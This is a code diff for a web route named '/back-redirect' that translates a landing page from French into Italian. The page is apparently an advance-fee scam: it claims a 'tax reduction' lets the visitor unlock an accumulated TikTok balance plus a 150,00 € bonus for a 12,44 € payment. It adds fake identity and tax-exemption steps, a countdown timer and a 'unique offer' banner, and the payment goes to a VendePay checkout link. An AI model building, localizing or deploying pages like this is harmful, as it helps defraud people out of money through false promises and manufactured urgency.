@@ -8,16 +8,16 @@ const VENDEPAY_BACK_REDIRECT_URL = "https://checkout.vendepay.com/ccef6ae4-dd83-
 export const Route = createFileRoute("/back-redirect")({
   head: () => ({
     meta: [
-      { title: "Réduction de taxes appliquée | Débloquez votre solde TikTok" },
+      { title: "Riduzione delle tasse applicata | Sblocca il tuo saldo TikTok" },
       {
         name: "description",
         content:
-          "Nous avons identifié une réduction de taxes et de frais : payez seulement 12,44 € et recevez 150,00 € de bonus au déblocage de votre solde.",
+          "Abbiamo individuato una riduzione di tasse e commissioni: paga solo 12,44 € e ricevi 150,00 € di bonus allo sblocco del tuo saldo.",
       },
-      { property: "og:title", content: "Réduction de taxes appliquée" },
+      { property: "og:title", content: "Riduzione delle tasse applicata" },
       {
         property: "og:description",
-        content: "Frais réduits à 12,44 € + 150,00 € de bonus. Offre à durée limitée.",
+        content: "Commissioni ridotte a 12,44 € + 150,00 € di bonus. Offerta a tempo limitato.",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
@@ -27,10 +27,10 @@ export const Route = createFileRoute("/back-redirect")({
 });
 
 const STEPS = [
-  "Vérification de votre identité",
-  "Recherche des exonérations fiscales",
-  "Application de la réduction des taxes",
-  "Calcul du bonus de compensation",
+  "Verifica della tua identità",
+  "Ricerca delle esenzioni fiscali",
+  "Applicazione della riduzione delle tasse",
+  "Calcolo del bonus di compensazione",
 ];
 
 function BackRedirect() {
@@ -92,35 +92,35 @@ function BackRedirect() {
 
         <div className="mb-6 w-full animate-pulse rounded-3xl border-2 border-emerald-500 bg-emerald-50 p-6">
           <p className="mb-2 text-[11px] font-black uppercase tracking-widest text-emerald-600">
-            ✅ Offre unique liée à votre dossier
+            ✅ Offerta unica legata alla tua pratica
           </p>
           <h1 className="text-2xl font-black leading-tight text-neutral-900">
-            NOUS AVONS IDENTIFIÉ UNE RÉDUCTION DE
+            ABBIAMO INDIVIDUATO UNA RIDUZIONE DI
             <br />
-            <span className="uppercase text-emerald-600">TAXES ET DE FRAIS !</span>
+            <span className="uppercase text-emerald-600">TASSE E COMMISSIONI!</span>
           </h1>
         </div>
 
         <div className="mb-8 w-full rounded-[2.5rem] border border-neutral-100 bg-white p-8 shadow-2xl">
           <p className="mb-4 text-[10px] font-bold uppercase tracking-widest text-neutral-400">
-            Cette offre expire dans :
+            Questa offerta scade tra:
           </p>
           <div className="mb-6 text-6xl font-black text-rose-500 tabular-nums">
             {mm}:{ss}
           </div>
 
           <div className="mb-6 space-y-3">
-            <p className="text-lg font-bold text-neutral-700">Frais réduits à seulement :</p>
+            <p className="text-lg font-bold text-neutral-700">Commissioni ridotte a soli:</p>
             <div className="text-4xl font-black italic text-neutral-900">12,44 €</div>
             <div className="mx-auto my-4 h-[2px] w-12 bg-neutral-200" />
             <p className="bg-gradient-to-r from-rose-500 to-sky-500 bg-clip-text text-2xl font-black uppercase italic tracking-tighter text-transparent">
-              + 150,00 € de bonus
+              + 150,00 € di bonus
             </p>
           </div>
 
           <p className="border-t border-neutral-100 pt-4 text-[11px] italic leading-tight text-neutral-400">
-            *La réduction de taxes et de frais a été appliquée. Dès le paiement des 12,44 €, le système
-            débloque immédiatement votre solde accumulé ainsi que le bonus de 150,00 €.
+            *La riduzione di tasse e commissioni è stata applicata. Dopo il pagamento dei 12,44 €, il sistema
+            sblocca immediatamente il tuo saldo accumulato e il bonus di 150,00 €.
           </p>
         </div>
 
@@ -129,7 +129,7 @@ function BackRedirect() {
           onClick={handleCta}
           className="w-full rounded-full bg-gradient-to-r from-rose-500 to-rose-600 py-6 text-xl font-black uppercase tracking-tighter text-white shadow-lg transition-all hover:from-rose-600 hover:to-rose-700 active:scale-[0.99]"
         >
-          Profiter de ma réduction + bonus
+          Approfitta della mia riduzione + bonus
         </button>
       </section>
     </main>
